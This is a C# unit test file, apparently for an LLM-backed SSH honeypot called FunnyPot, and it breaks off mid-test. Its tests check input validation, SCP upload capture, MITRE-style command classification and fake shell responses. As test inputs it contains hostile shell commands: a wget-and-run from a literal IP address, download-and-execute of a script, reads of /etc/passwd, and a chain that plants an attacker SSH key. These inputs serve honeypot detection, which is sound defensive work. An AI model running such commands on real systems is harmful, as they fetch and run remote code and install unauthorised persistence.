using Xunit;

namespace FunnyPot.Tests;

public class InputValidatorTests
{
    [Fact]
    public void Validate_NullInput_ReturnsFalse()
    {
        var result = InputValidator.Validate(null!);
        Assert.False(result.isValid);
        Assert.Equal("Input empty", result.error);
    }

    [Fact]
    public void Validate_EmptyInput_ReturnsFalse()
    {
        var result = InputValidator.Validate("");
        Assert.False(result.isValid);
        Assert.Equal("Input empty", result.error);
    }

    [Fact]
    public void Validate_WhitespaceInput_ReturnsTrue()
    {
        var result = InputValidator.Validate("   ");
        Assert.True(result.isValid);
    }

    [Fact]
    public void Validate_ExceedsMaxLength_ReturnsFalse()
    {
        var longInput = new string('a', InputValidator.MaxInputLength + 1);
        var result = InputValidator.Validate(longInput);
        Assert.False(result.isValid);
        Assert.Contains("Input too long", result.error);
    }

    [Fact]
    public void Validate_AtMaxLength_ReturnsTrue()
    {
        var sb = new System.Text.StringBuilder(InputValidator.MaxInputLength);
        for (int i = 0; i < InputValidator.MaxInputLength; i++)
            sb.Append(i % 2 == 0 ? 'a' : 'b');
        var result = InputValidator.Validate(sb.ToString());
        Assert.True(result.isValid);
    }

    [Fact]
    public void Validate_ContainsNullByte_ReturnsFalse()
    {
        var input = "test\0data";
        var result = InputValidator.Validate(input);
        Assert.False(result.isValid);
        Assert.Equal("Binary content not allowed", result.error);
    }

    [Fact]
    public void Validate_NoNullBytes_ReturnsTrue()
    {
        var result = InputValidator.Validate("正常输入");
        Assert.True(result.isValid);
    }

    [Fact]
    public void Validate_RepetitiveCharsExceedsLimit_ReturnsFalse()
    {
        var input = new string('a', InputValidator.MaxRepetitiveChars + 1);
        var result = InputValidator.Validate(input);
        Assert.False(result.isValid);
        Assert.Equal("Repetitive input detected", result.error);
    }

    [Fact]
    public void Validate_ValidRepetitiveInput_ReturnsTrue()
    {
        var input = new string('a', InputValidator.MaxRepetitiveChars);
        var result = InputValidator.Validate(input);
        Assert.True(result.isValid);
    }

    [Fact]
    public void Validate_NormalCommand_ReturnsTrue()
    {
        var result = InputValidator.Validate("ls -la /home");
        Assert.True(result.isValid);
    }

    [Fact]
    public void Validate_ValidLongInput_ReturnsTrue()
    {
        var input = "ls -la /home/user/documents/projects/codebase/src/modules/utilities/helpers/";
        var result = InputValidator.Validate(input);
        Assert.True(result.isValid);
    }
}

public class SCPDetectorTests
{
    [Theory]
    [InlineData("scp", true)]
    [InlineData("SCP", true)]
    [InlineData("scp -t somefile", true)]
    [InlineData("scp -f somefile", true)]
    [InlineData("sftp", true)]
    [InlineData("SFTP", true)]
    [InlineData("ssh -D 1080 host", false)]
    [InlineData("ssh user@host", false)]
    [InlineData("ls -la", false)]
    [InlineData("cat file.txt", false)]
    [InlineData("cd /home", false)]
    [InlineData("rm -rf /", false)]
    [InlineData("git commit -m 'fix'", false)]
    [InlineData("grep -r 'foo' .", false)]
    [InlineData("tar -cf archive.tar .", false)]
    public void IsSCPCommand_DetectsCorrectly(string input, bool expected)
    {
        var result = SCPDetector.IsSCPCommand(input);
        Assert.Equal(expected, result);
    }
}

public class SCPUploadSessionTests
{
    [Fact]
    public void HandleData_CapturesBinaryUploadToLogDirectory()
    {
        var previousLogDir = Program.LogDir;
        var tempDir = Path.Combine(Path.GetTempPath(), Guid.NewGuid().ToString("N"));
        Program.LogDir = tempDir;

        try
        {
            var session = new SCPUploadSession("abcdef123456", "fallback.bin");
            var acks = new List<byte[]>();
            var closeReasons = new List<string>();
            var payload = new byte[] { 0, 1, 2, 255, 10 };
            var packet = new byte["C0644 5 payload.bin\n"u8.Length + payload.Length + 1];
            "C0644 5 payload.bin\n"u8.CopyTo(packet);
            payload.CopyTo(packet.AsSpan("C0644 5 payload.bin\n"u8.Length));
            packet[^1] = 0;

            session.HandleData(packet, acks.Add, closeReasons.Add);

            Assert.Equal("SCPUploadCaptured", Assert.Single(closeReasons));
            Assert.Equal(2, acks.Count);
            Assert.All(acks, ack => Assert.Equal(new byte[] { 0 }, ack));

            var uploadDir = Path.Combine(tempDir, "uploads", "abcdef12");
            var path = Assert.Single(Directory.GetFiles(uploadDir, "*_payload.bin"));
            Assert.Equal(payload, File.ReadAllBytes(path));
        }
        finally
        {
            Program.LogDir = previousLogDir;
            if (Directory.Exists(tempDir))
                Directory.Delete(tempDir, recursive: true);
        }
    }

    [Fact]
    public void HandleData_RejectsUploadsLargerThanFiveMegabytes()
    {
        var previousLogDir = Program.LogDir;
        var tempDir = Path.Combine(Path.GetTempPath(), Guid.NewGuid().ToString("N"));
        Program.LogDir = tempDir;

        try
        {
            var session = new SCPUploadSession("abcdef123456", "fallback.bin");
            var closeReasons = new List<string>();
            var header = $"C0644 {SCPUploadHandler.MaxUploadBytes + 1} payload.bin\n";

            session.HandleData(System.Text.Encoding.ASCII.GetBytes(header), _ => { }, closeReasons.Add);

            Assert.Equal("SCPUploadTooLarge", Assert.Single(closeReasons));
            Assert.False(Directory.Exists(Path.Combine(tempDir, "uploads", "abcdef12")));
        }
        finally
        {
            Program.LogDir = previousLogDir;
            if (Directory.Exists(tempDir))
                Directory.Delete(tempDir, recursive: true);
        }
    }
}

public class DataHarvesterTests
{
    [Fact]
    public void LevenshteinDistance_DetectsPasswordMutation()
    {
        var distance = DataHarvester.LevenshteinDistance("root:password1", "root:password2");
        Assert.Equal(1, distance);
    }

    [Fact]
    public void AnalyzeCommand_ExtractsPayloadAndDiscoverySignals()
    {
        var analysis = DataHarvester.AnalyzeCommand("cat /etc/passwd; wget http://example.com/a.sh -O /tmp/a.sh");

        Assert.Equal(1, analysis.DiscoveryDepthScore);
        Assert.Contains("http://example.com/a.sh", analysis.PayloadUrls);
        Assert.Contains("Command and Control", analysis.MitreAttackTechniques);
        Assert.Contains("Discovery", analysis.MitreAttackTechniques);
    }

    [Fact]
    public void AnalyzeCommand_DetectsPersistenceAndTunneling()
    {
        var analysis = DataHarvester.AnalyzeCommand("echo key >> ~/.ssh/authorized_keys && ssh -D 1080 host");

        Assert.Equal("ssh_authorized_keys", analysis.PersistenceVector);
        Assert.Equal("dynamic_forward", analysis.TunnelingIntent);
        Assert.True(analysis.AssetValuePerceptionScore > 0);
    }

    [Fact]
    public void AnalyzeCommand_ClassifiesRouterOsProbeAsReconnaissance()
    {
        var analysis = DataHarvester.AnalyzeCommand("/ip cloud print");

        Assert.Equal("mikrotik_routeros_probe", analysis.ReconnaissanceProbe);
        Assert.Contains("Reconnaissance", analysis.MitreAttackTechniques);
    }

    [Theory]
    [InlineData("uname -s -m")]
    [InlineData("/bin/./uname -s -v -n -r -m")]
    [InlineData("ifconfig")]
    [InlineData("ip addr show")]
    [InlineData("whoami")]
    public void AnalyzeCommand_ClassifiesHostAndNetworkEnumerationAsDiscovery(string command)
    {
        var analysis = DataHarvester.AnalyzeCommand(command);

        Assert.True(analysis.DiscoveryDepthScore > 0);
        Assert.Contains("Discovery", analysis.MitreAttackTechniques);
    }

    [Fact]
    public void AnalyzeCommand_DoesNotClassifyToolVersionCheckAsCommandAndControl()
    {
        var analysis = DataHarvester.AnalyzeCommand("curl --version");

        Assert.DoesNotContain("Command and Control", analysis.MitreAttackTechniques);
    }

    [Fact]
    public void CalculateFingerprintHash_IsDeterministicAndNormalizesInput()
    {
        var first = DataHarvester.CalculateFingerprintHash("SSH-2.0-Client", "RSA-SHA2-512", "AA:BB");
        var second = DataHarvester.CalculateFingerprintHash("ssh-2.0-client", "rsa-sha2-512", "aa:bb");

        Assert.Equal(first, second);
        Assert.Equal(64, first.Length);
    }

    [Fact]
    public void IsFailureResponse_DoesNotTreatGenericErrorWordAsFailure()
    {
        Assert.False(DataHarvester.IsFailureResponse("/var/log/error.log"));
        Assert.True(DataHarvester.IsFailureResponse("bash: nope: command not found"));
    }

    [Fact]
    public void ShellSessionAnalytics_TracksFailureRatioAndSemanticDrift()
    {
        var analytics = new ShellSessionAnalytics { SessionStartedAt = DateTime.UtcNow.AddSeconds(-10) };

        analytics.RecordCommand(DataHarvester.AnalyzeCommand("ls"));
        analytics.RecordResult(false);
        analytics.RecordCommand(DataHarvester.AnalyzeCommand("cat /etc/passwd | grep root && wget http://example.com/a.sh"));
        analytics.RecordResult(true);

        Assert.Equal(0.5, analytics.StandardErrorRatio);
        Assert.True(analytics.SemanticDrift > 0);
        Assert.Contains("Command and Control", analytics.MitreTechniqueCounts.Keys);
        Assert.True(analytics.CalculateTuringMultiplier() > 0);
    }
}

public class LoggerTests
{
    [Fact]
    public void GetSessionLogUniquePart_HandlesShortSessionIds()
    {
        Assert.Equal("abc", Logger.GetSessionLogUniquePart("default", "abc"));
        Assert.Equal("abcdefgh", Logger.GetSessionLogUniquePart("default", "abcdefghijk"));
        Assert.Equal("custom", Logger.GetSessionLogUniquePart("custom", "abcdefghijk"));
    }

    [Fact]
    public void ShouldRequestDataPush_AllowsInitialAndElapsedRequests()
    {
        var now = DateTime.UtcNow;
        var interval = TimeSpan.FromMinutes(5);

        Assert.True(Logger.ShouldRequestDataPush(now, DateTime.MinValue, interval, force: false));
        Assert.True(Logger.ShouldRequestDataPush(now, now.AddMinutes(-6), interval, force: false));
    }

    [Fact]
    public void ShouldRequestDataPush_DebouncesNonBoundaryEvents()
    {
        var now = DateTime.UtcNow;
        var interval = TimeSpan.FromMinutes(5);

        Assert.False(Logger.ShouldRequestDataPush(now, now.AddMinutes(-1), interval, force: false));
        Assert.True(Logger.ShouldRequestDataPush(now, now.AddMinutes(-1), interval, force: true));
    }

    [Fact]
    public void ApplyHarvestSummaryEvent_TracksUniqueScanIpsAndShells()
    {
        var summary = new HarvestSummary();
        var timestamp = DateTime.UtcNow;

        Logger.ApplyHarvestSummaryEvent(summary, "auth_attempt", new AuthAttemptLogEntry { RemoteEndpoint = "203.0.113.5:49152", Username = "root", Password = "admin" }, timestamp);
        Logger.ApplyHarvestSummaryEvent(summary, "auth_attempt", new AuthAttemptLogEntry { RemoteEndpoint = "203.0.113.5:49153", Username = "root", Password = "admin" }, timestamp);
        Logger.ApplyHarvestSummaryEvent(summary, "auth_attempt", new AuthAttemptLogEntry { RemoteEndpoint = "198.51.100.7:22", Username = "support", Password = "password" }, timestamp);
        Logger.ApplyHarvestSummaryEvent(summary, "shell_session_start", new SessionLogEntry(), timestamp);

        Assert.Equal(3, summary.TotalScanAttempts);
        Assert.Equal(2, summary.UniqueScanIps);
        Assert.Equal(2, summary.ScansByIp["203.0.113.5"]);
        Assert.Equal(1, summary.ScansByIp["198.51.100.7"]);
        Assert.Equal(2, summary.TopUsernames["root"]);
        Assert.Equal(1, summary.TopUsernames["support"]);
        Assert.Equal(2, summary.TopPasswords["admin"]);
        Assert.Equal(1, summary.TopPasswords["password"]);
        Assert.Equal(1, summary.TotalShells);
    }
}

public class ProgramTests
{
    [Theory]
    [InlineData("203.0.113.5:49152", "203.0.113.5")]
    [InlineData("[2001:db8::1]:49152", "2001:db8::1")]
    [InlineData("unknown", "unknown")]
    public void GetRemoteAttemptKey_UsesIpWithoutSourcePort(string remoteEndpoint, string expected)
    {
        Assert.Equal(expected, Program.GetRemoteAttemptKey(remoteEndpoint));
    }

    [Fact]
    public void GetIntEnvironmentOrDefault_UsesValidEnvironmentValue()
    {
        var name = $"FUNNYPOT_TEST_INT_{Guid.NewGuid():N}";
        Environment.SetEnvironmentVariable(name, "22722");

        try
        {
            Assert.Equal(22722, Program.GetIntEnvironmentOrDefault(name, 22422));
        }
        finally
        {
            Environment.SetEnvironmentVariable(name, null);
        }
    }

    [Theory]
    [InlineData(null)]
    [InlineData("")]
    [InlineData("not-a-number")]
    public void GetIntEnvironmentOrDefault_FallsBackForMissingOrInvalidValue(string? value)
    {
        var name = $"FUNNYPOT_TEST_INT_{Guid.NewGuid():N}";
        Environment.SetEnvironmentVariable(name, value);

        try
        {
            Assert.Equal(22422, Program.GetIntEnvironmentOrDefault(name, 22422));
        }
        finally
        {
            Environment.SetEnvironmentVariable(name, null);
        }
    }
}

public class CommandResolverTests
{
    [Fact]
    public void NormalizeExecutableName_HandlesObfuscatedBinPath()
    {
        Assert.Equal("uname", CommandResolver.NormalizeExecutableName("/bin/./uname"));
    }

    [Fact]
    public void FormatUname_ReturnsOldEolDebianKernelFingerprint()
    {
        var response = CommandResolver.FormatUname(new[] { "-s", "-v", "-n", "-r", "-m" });

        Assert.Contains("Linux", response);
        Assert.Contains("omegablack", response);
        Assert.Contains("2.6.32-5-amd64", response);
        Assert.Contains("Jan 16 16:22:28 UTC 2012", response);
        Assert.Contains("x86_64", response);
    }

    [Fact]
    public void FormatCpuInfo_UsesStaticProcCpuinfoShapeWithProvidedValues()
    {
        var response = CommandResolver.FormatCpuInfo(new CpuInfoValues
        {
            CpuCount = 2,
            BogoMips = "50.00",
            Implementer = "0x41",
            Architecture = 8,
            Variant = "0x1",
            Parts = new List<string> { "0xd82", "0xd80" },
            Revision = 2
        });

        Assert.Contains("processor\t: 0", response);
        Assert.Contains("processor\t: 1", response);
        Assert.Contains("BogoMIPS\t: 50.00", response);
        Assert.Contains("Features\t: fp asimd", response);
        Assert.Contains("CPU implementer\t: 0x41", response);
        Assert.Contains("CPU architecture: 8", response);
        Assert.Contains("CPU variant\t: 0x1", response);
        Assert.Contains("CPU part\t: 0xd82", response);
        Assert.Contains("CPU part\t: 0xd80", response);
        Assert.Contains("CPU revision\t: 2", response);
    }

    [Fact]
    public void TryParseCpuInfoValues_ReadsLlmJsonValues()
    {
        var parsed = CommandResolver.TryParseCpuInfoValues(
            "```json\n{\"cpuCount\":2,\"bogoMips\":\"51.20\",\"implementer\":\"0x41\",\"architecture\":8,\"variant\":\"0x0\",\"parts\":[\"0xd82\",\"0xd80\"],\"revision\":1}\n```",
            out var values);

        Assert.True(parsed);
        Assert.Equal(2, values.CpuCount);
        Assert.Equal("51.20", values.BogoMips);
        Assert.Equal(new[] { "0xd82", "0xd80" }, values.Parts);
    }

    [Fact]
    public void FormatUptimePretty_NeverReportsShortUptime()
    {
        SyntheticHostClock.ResetForTests(DateTime.UtcNow.AddDays(-21).AddHours(-4).AddMinutes(-9));

        try
        {
            var response = CommandResolver.FormatUptime(new[] { "-p" });

            Assert.Contains("up 21 days", response);
            Assert.Contains("4 hours", response);
        }
        finally
        {
            SyntheticHostClock.ResetForTests();
        }
    }

    [Fact]
    public void SyntheticHostClock_PersistsBootTimeState()
    {
        var tempDir = Path.Combine(Path.GetTempPath(), Guid.NewGuid().ToString("N"));
        var statePath = Path.Combine(tempDir, "persona_state.json");
        var now = DateTime.UtcNow;

        try
        {
            SyntheticHostClock.ResetForTests(statePath: statePath);
            var first = SyntheticHostClock.GetUptime(now);
            SyntheticHostClock.ResetForTests(statePath: statePath);
            var second = SyntheticHostClock.GetUptime(now.AddMinutes(5));

            Assert.True(File.Exists(statePath));
            Assert.InRange(first.TotalDays, SyntheticHostClock.MinInitialUptimeDays, SyntheticHostClock.MaxInitialUptimeDays + 2);
            Assert.True(second > first);
        }
        finally
        {
            SyntheticHostClock.ResetForTests();
            if (Directory.Exists(tempDir))
                Directory.Delete(tempDir, recursive: true);
        }
    }

    [Theory]
    [InlineData("(Empty response)")]
    [InlineData("No output")]
    [InlineData("No output.")]
    public void NormalizeTerminalOutput_TreatsEmptyOutputMarkersAsNoOutput(string response)
    {
        Assert.Equal("", Program.NormalizeTerminalOutput(response));
    }

    [Fact]
    public void BuildSystemPrompt_InstructsLlmAboutRedirectionAndBinaryCatOutput()
    {
        var prompt = Program.BuildSystemPrompt("remote");

        Assert.Contains("echo 1 > /dev/null", prompt);
        Assert.Contains("following `&&` command should still run", prompt);
        Assert.Contains("/bin/echo", prompt);
        Assert.Contains("\\x7fELF", prompt);
        Assert.Contains("Never replace binary file contents with only the path or a single `/`", prompt);
    }

    [Fact]
    public void BuildSystemPrompt_LocksMetaResponseAndReservesStandardCommandNotFound()
    {
        var prompt = Program.BuildSystemPrompt("remote");

        Assert.Contains("bash: who are you: command not found", prompt);
        Assert.Contains("meta-questions", prompt);
        Assert.Contains("bash: <command>: command not found", prompt);
    }

    [Fact]
    public void BuildSystemPrompt_GivesPlausibleExamplesForObservedAttackerCommands()
    {
        var prompt = Program.BuildSystemPrompt("remote");

        Assert.Contains("`echo Hi | cat -n`", prompt);
        Assert.Contains("`1\\tHi`", prompt);
        Assert.Contains("`ifconfig`", prompt);
        Assert.Contains("`lspci | grep VGA | cut -f5- -d ' '`", prompt);
        Assert.Contains("`locate <pattern>`", prompt);
    }

    [Fact]
    public void StaticResponseStore_IfconfigHasPlausibleNetworkDump()
    {
        var response = StaticResponseStore.GetResponse("ifconfig", "/root");

        Assert.NotNull(response);
        Assert.Contains("eth0", response);
        Assert.Contains("Link encap:Ethernet", response);
        Assert.Contains("inet addr:", response);
        Assert.Contains("lo", response);
    }

    [Fact]
    public void IsModelFailureResponse_DetectsApiAndNetworkErrors()
    {
        Assert.True(CommandResolver.IsModelFailureResponse("[api error] 401: missing key"));
        Assert.True(CommandResolver.IsModelFailureResponse("[network error] timeout"));
        Assert.False(CommandResolver.IsModelFailureResponse("bash: nope: command not found"));
    }

    [Theory]
    [InlineData("cd /tmp || cd /run; wget http://45.81.234.64/10Gbins.sh; chmod 777 10Gbins.sh; sh 10Gbins.sh")]
    [InlineData("ps -ef | grep '[Mm]iner'")]
    [InlineData("cat /etc/passwd && uname -a")]
    public void IsCompoundShellCommand_DetectsShellOperators(string command)
    {
        Assert.True(CommandResolver.IsCompoundShellCommand(command));
    }

    [Theory]
    [InlineData("echo 'a;b'")]
    [InlineData("echo \"a|b\"")]
    [InlineData("echo 'a&&b'")]
    public void IsCompoundShellCommand_IgnoresOperatorsInsideQuotes(string command)
    {
        Assert.False(CommandResolver.IsCompoundShellCommand(command));
    }

    [Theory]
    [InlineData("cd /tmp")]
    [InlineData("uname -a")]
    [InlineData("ls -la")]
    public void IsCompoundShellCommand_IgnoresSimpleCommands(string command)
    {
        Assert.False(CommandResolver.IsCompoundShellCommand(command));
    }

    [Theory]
    [InlineData("cd /tmp", "BuiltIn")]
    [InlineData("pwd", "BuiltIn")]
    [InlineData("uname -a", "BuiltIn")]
    [InlineData("echo hello", "BuiltIn")]
    [InlineData("/bin/./uname -a", "BuiltIn")]
    [InlineData("locate D877F783D5D3EF8Cs", "BuiltIn")]
    [InlineData("cat /etc/passwd", "StaticDataset")]
    [InlineData("ps", "StaticDataset")]
    [InlineData("ls /var/log", "StaticDataset")]
    [InlineData("ifconfig", "StaticDataset")]
    [InlineData("scp /tmp/a remote:/tmp/a", "Blocked")]
    public void ClassifyCommand_ShortCircuitsSimpleCommands(string command, string expectedPath)
    {
        var fs = FakeFileSystem.GetOrCreate(Guid.NewGuid().ToString("N"));

        var path = CommandResolver.ClassifyCommand(command, fs);

        Assert.Equal(expectedPath, path.ToString());
    }

    [Fact]
    public async Task ResolveCommand_ReturnsLinuxErrorForRouterOsProbe()
    {
        var fs = FakeFileSystem.GetOrCreate(Guid.NewGuid().ToString("N"));
        var history = new List<ChatRequestData.ChatMessage>();

        var (response, usedStatic, rateLimited, promptTokens, completionTokens) = await CommandResolver.ResolveCommandAsync(
            "/ip cloud print",
            Guid.NewGuid().ToString("N"),
            Guid.NewGuid().ToString("N"),
            fs,
            history,
            CancellationToken.None);

        Assert.Equal("bash: /ip: No such file or directory", response);
        Assert.True(usedStatic);
        Assert.False(rateLimited);
        Assert.Equal(0, promptTokens);
        Assert.Equal(0, completionTokens);
    }

    [Theory]
    [InlineData("cd /tmp || cd /run || cd /; wget http://45.81.234.64/10Gbins.sh; chmod 777 10Gbins.sh; sh 10Gbins.sh")]
    [InlineData("ps -ef | grep '[Mm]iner'")]
    [InlineData("cat /etc/passwd && uname -a")]
    [InlineData("ls /var/log; cat /etc/passwd")]
    [InlineData("wget http://example.com/a.sh -O /tmp/a.sh && sh /tmp/a.sh")]
    [InlineData("find / -perm -4000 -type f 2>/dev/null")]
    [InlineData("python3 -c 'import os; print(os.getuid())'")]
    public void ClassifyCommand_PassesComplexOrUnknownCommandsToLlm(string command)
    {
        var fs = FakeFileSystem.GetOrCreate(Guid.NewGuid().ToString("N"));

        var path = CommandResolver.ClassifyCommand(command, fs);

        Assert.Equal(CommandResolver.CommandResolutionPath.Llm, path);
    }

    [Fact]
    public void ClassifyCommand_DoesNotMutateFilesystemForCdClassification()
    {
        var fs = FakeFileSystem.GetOrCreate(Guid.NewGuid().ToString("N"));

        var path = CommandResolver.ClassifyCommand("cd /tmp", fs);

        Assert.Equal(CommandResolver.CommandResolutionPath.BuiltIn, path);
        Assert.Equal("/home/remote", fs.CurrentDirectory);
    }

    [Fact]
    public void FakeFileSystem_ResolveParentFromTopLevelReturnsRoot()
    {
        var fs = FakeFileSystem.GetOrCreate(Guid.NewGuid().ToString("N"));
        fs.ChangeDirectory("/home");

        Assert.Equal("/", fs.ResolvePath(".."));
    }

    [Theory]
    [InlineData("/bin/echo")]
    [InlineData("/bin/bash")]
    [InlineData("/usr/bin/curl")]
    [InlineData("/sbin/ip")]
    [InlineData("/usr/sbin/cron")]
    [InlineData("/usr/local/bin/deploy.sh")]
    [InlineData("/lib/ld-linux-x86-64.so.2")]
    [InlineData("/usr/lib/x86_64-linux-gnu/libssl.so.1.0.0")]
    public void FakeFileSystem_ReportsReasonableFilesAsPresent(string path)
    {
        var fs = FakeFileSystem.GetOrCreate(Guid.NewGuid().ToString("N"));

        Assert.True(fs.FileExists(path));
    }

    [Theory]
    [InlineData("cat /bin/echo")]
    [InlineData("cat /bin/bash")]
    [InlineData("cat /usr/bin/curl")]
    [InlineData("cat /sbin/ip")]
    [InlineData("cat /lib/ld-linux-x86-64.so.2")]
    [InlineData("/bin/cat /bin/echo")]
    [InlineData("/usr/bin/cat /bin/ls")]
    public void IsBinaryExecutableCatCommand_DetectsAnyBinaryPath(string command)
    {
        Assert.True(CommandResolver.IsBinaryExecutableCatCommand(command));
    }

    [Theory]
    [InlineData("cat /etc/passwd")]
    [InlineData("cat /var/log/auth.log")]
    [InlineData("cat /home/secretOps/.env")]
    [InlineData("cat /opt/app/config.yml")]
    public void IsBinaryExecutableCatCommand_DoesNotMatchRegularFiles(string command)
    {
        Assert.False(CommandResolver.IsBinaryExecutableCatCommand(command));
    }

    [Fact]
    public void FakeFileSystem_ListsRealisticContentsForEnrichedPaths()
    {
        var fs = FakeFileSystem.GetOrCreate(Guid.NewGuid().ToString("N"));

        var opt = fs.ListDirectory("/opt");
        Assert.Contains("app", opt);
        Assert.Contains("monitoring", opt);

        var srvWww = fs.ListDirectory("/srv/www/html");
        Assert.Contains("index.html", srvWww);

        var varLog = fs.ListDirectory("/var/log");
        Assert.Contains("auth.log", varLog);
        Assert.Contains("fail2ban.log", varLog);
    }

    [Fact]
    public void StripShellQuotes_RemovesSimpleShellQuotes()
    {
        Assert.Equal("hello world", CommandResolver.StripShellQuotes("\"hello world\""));
        Assert.Equal("hello world", CommandResolver.StripShellQuotes("'hello world'"));
    }

    [Theory]
    [InlineData("echo \"hello world\"", "hello world")]
    [InlineData("type", "type: usage")]
    [InlineData("which", "Usage: which")]
    [InlineData("getconf", "Usage: getconf")]
    [InlineData("who", "remote   pts/0")]
    [InlineData("locate D877F783D5D3EF8Cs", "Electrum")]
    [InlineData("locate wallet", "/opt/app/data/wallet")]
    [InlineData("locate ab", "at least 3 characters")]
    public async Task ResolveCommand_BuiltInsReturnExpectedOutput(string command, string expectedFragment)
    {
        var fs = FakeFileSystem.GetOrCreate(Guid.NewGuid().ToString("N"));
        var history = new List<ChatRequestData.ChatMessage>();

        var (response, _, _, _, _) = await CommandResolver.ResolveCommandAsync(
            command,
            Guid.NewGuid().ToString("N"),
            Guid.NewGuid().ToString("N"),
            fs,
            history,
            CancellationToken.None);

        Assert.Contains(expectedFragment, response);
    }

    [Fact]
    public void GenerateLocalFallbackResponse_ReturnsShellOutputForCompoundCommands()
    {
        var response = CommandResolver.GenerateLocalFallbackResponse("cat /etc/passwd | grep root; wget http://example.com/a.sh -O /tmp/a.sh");

        Assert.Contains("root:x:0:0:root:/root:/bin/bash", response);
        Assert.DoesNotContain("api error", response, StringComparison.OrdinalIgnoreCase);
        Assert.DoesNotContain("network error", response, StringComparison.OrdinalIgnoreCase);
    }

    [Theory]
    [InlineData("cat /etc/passwd && uname -a", "root:x:0:0:root:/root:/bin/bash", "Linux omegablack")]
    [InlineData("ls /var/log; cat /etc/passwd", "auth.log", "secretOps:x:1002")]
    [InlineData("find / -perm -4000 -type f 2>/dev/null", "/usr/bin/passwd", "/bin/su")]
    [InlineData("ps -ef | grep '[Mm]iner'", "kinsing", "grep [Mm]iner")]
    public async Task ResolveCommand_PreParsesDeterministicCompoundCommands(string command, string expectedFirst, string expectedSecond)
    {
        var fs = FakeFileSystem.GetOrCreate(Guid.NewGuid().ToString("N"));
        var history = new List<ChatRequestData.ChatMessage>
        {
            new() { Role = "user", Content = command }
        };

        var (response, usedStatic, rateLimited, promptTokens, completionTokens) = await CommandResolver.ResolveCommandAsync(
            command,
            Guid.NewGuid().ToString("N"),
            Guid.NewGuid().ToString("N"),
            fs,
            history,
            CancellationToken.None);

        Assert.Contains(expectedFirst, response);
        Assert.Contains(expectedSecond, response);
        Assert.True(usedStatic);
        Assert.False(rateLimited);
        Assert.Equal(0, promptTokens);
        Assert.Equal(0, completionTokens);
    }

    [Fact]
    public async Task ResolveCommand_PreParsedShellOperatorsHonorConditionalExecution()
    {
        var fs = FakeFileSystem.GetOrCreate(Guid.NewGuid().ToString("N"));
        var command = "false && uname -a || pwd";
        var history = new List<ChatRequestData.ChatMessage>
        {
            new() { Role = "user", Content = command }
        };

        var (response, usedStatic, _, _, _) = await CommandResolver.ResolveCommandAsync(
            command,
            Guid.NewGuid().ToString("N"),
            Guid.NewGuid().ToString("N"),
            fs,
            history,
            CancellationToken.None);

        Assert.Equal("/home/remote", response);
        Assert.True(usedStatic);
    }

    [Theory]
    [InlineData("cd ~; chattr -ia .ssh; lockr -ia .ssh")]
    [InlineData("cd ~ && rm -rf .ssh && mkdir .ssh && echo \"ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2 attacker\">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~")]
    public async Task ResolveCommand_PersistenceSetupChainsReturnQuietSuccess(string command)
    {
        var fs = FakeFileSystem.GetOrCreate(Guid.NewGuid().ToString("N"));
        var history = new List<ChatRequestData.ChatMessage>
        {
            new() { Role = "user", Content = command }
        };

        var (response, usedStatic, rateLimited, promptTokens, completionTokens) = await CommandResolver.ResolveCommandAsync(
            command,
            Guid.NewGuid().ToString("N"),
            Guid.NewGuid().ToString("N"),
            fs,
            history,
            CancellationToken.None);

        Assert.Equal("", response);
        Assert.True(usedStatic);
        Assert.False(rateLimited);
        Assert.Equal(0, promptTokens);
        Assert.Equal(0, completionTokens);
        Assert.Equal("/home/remote", fs.CurrentDirectory);
    }

    [Fact]
    public async Task ResolveCommand_ReturnsLocalBinaryOutputForEchoExecutableCat()
    {
        var fs = FakeFileSystem.GetOrCreate(Guid.NewGuid().ToString("N"));
        var history = new List<ChatRequestData.ChatMessage>();

        var (response, usedStatic, rateLimited, promptTokens, completionTokens) = await CommandResolver.ResolveCommandAsync(
            "cat /bin/echo",
            Guid.NewGuid().ToString("N"),
            Guid.NewGuid().ToString("N"),
            fs,
            history,
            CancellationToken.None);

        Assert.StartsWith("ELF'@@8", response);
        Assert.Contains("/lib/ld-linux-aarch64.so.1", response);
        Assert.Contains("GLIBC_2.17", response);
        Assert.Contains("binary output truncated", response);
        Assert.False(usedStatic);
        Assert.False(rateLimited);
        Assert.Equal(0, promptTokens);
        Assert.Equal(0, completionTokens);
        Assert.Empty(history);
    }

    [Fact]
    public void StaticResponses_AreValidJsonLines()
    {
        var path = Path.GetFullPath(Path.Combine(AppContext.BaseDirectory, "../../../../FunnyPot/data/ssh_responses.jsonl"));

        foreach (var line in File.ReadLines(path).Where(line => !string.IsNullOrWhiteSpace(line)))
        {
            using var _ = System.Text.Json.JsonDocument.Parse(line);
        }
    }

    [Fact]
    public void StaticResponses_DoNotCaptureUnhandledDynamicCommandVariants()
    {
        Assert.NotNull(StaticResponseStore.GetResponse("ps", "/root"));
        Assert.Null(StaticResponseStore.GetResponse("ps | grep '[Mm]iner'", "/root"));
    }

    [Fact]
    public void BuildApiUrl_JoinsBaseAndEndpoint()
    {
        Assert.Equal("https://openrouter.ai/api/v1/chat/completions", Program.BuildApiUrl("https://openrouter.ai/api/v1/", "/chat/completions"));
    }

    [Fact]
    public void TryParseOpenRouterResponse_ExtractsContentAndUsage()
    {
        using var doc = System.Text.Json.JsonDocument.Parse("""
            {
              "choices": [{ "message": { "content": "ok" } }],
              "usage": { "prompt_tokens": 10, "completion_tokens": 2, "total_tokens": 12 }
            }
            """);

        var parsed = Program.TryParseOpenRouterResponse(doc.RootElement, out var content, out var promptTokens, out var completionTokens, out var totalTokens);

        Assert.True(parsed);
        Assert.Equal("ok", content);
        Assert.Equal(10, promptTokens);
        Assert.Equal(2, completionTokens);
        Assert.Equal(12, totalTokens);
    }

    [Fact]
    public void TryParseOpenRouterResponse_RejectsMissingChoices()
    {
        using var doc = System.Text.Json.JsonDocument.Parse("{\"error\":{\"message\":\"bad\"}}");

        Assert.False(Program.TryParseOpenRouterResponse(doc.RootElement, out _, out _, out _, out _));
    }
}

public class AppConfigurationTests
{
    [Fact]
    public void Load_WhenConfigMissing_ReturnsDefaults()
    {
        var config = AppConfiguration.Load("/tmp/non-existent-funnypot-config.yaml");

        Assert.Equal(22422, config.Ssh.Port);
        Assert.Equal(50, config.Ssh.MaxSessions);
        Assert.Equal(500, config.Llm.DelayMs);
    }

    [Fact]
    public void Load_WhenConfigExists_UsesFileValues()
    {
        var tempPath = Path.Combine(Path.GetTempPath(), $"funnypot-config-{Guid.NewGuid():N}.yaml");
